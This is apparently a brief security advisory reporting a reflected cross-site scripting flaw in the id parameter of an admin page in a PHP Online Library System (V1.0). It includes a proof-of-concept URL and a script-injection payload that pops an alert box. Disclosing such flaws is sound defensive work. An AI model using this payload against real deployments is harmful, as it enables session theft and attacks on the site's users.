#### BUG_AUTHOR:LIU WEIYU
# Online Library System – reflected XSS on (admin/books/index.php?view=edit&id=1345673) 
## Vendor Homepage:
https://www.sourcecodester.com/php/14816/online-library-system-phpmysqli-full-source-code.html 
## Version:V1.0
## Tested on: PHP, Apache, MySQL
## Affected Page:
admin/books/index.php 
On this page,id parameter is vulnerable to reflected XSS Attack 
## Proof of vulnerability:
Visit this page after logining：
http://localhost/OLS/admin/books/index.php?view=edit&id=1345673 
<img width="1000" alt="image" src="https://github.com/thisissuperann/Vul/assets/148440408/bc27a50c-9051-4365-bde7-058983824c96">
## Payload：
？id= "> <script>alert(1)</script>
## Trigger popup：
<img width="416" alt="image" src="https://github.com/thisissuperann/Vul/assets/148440408/63f493d5-1e70-4b0d-84d8-3af39f4a96d7">
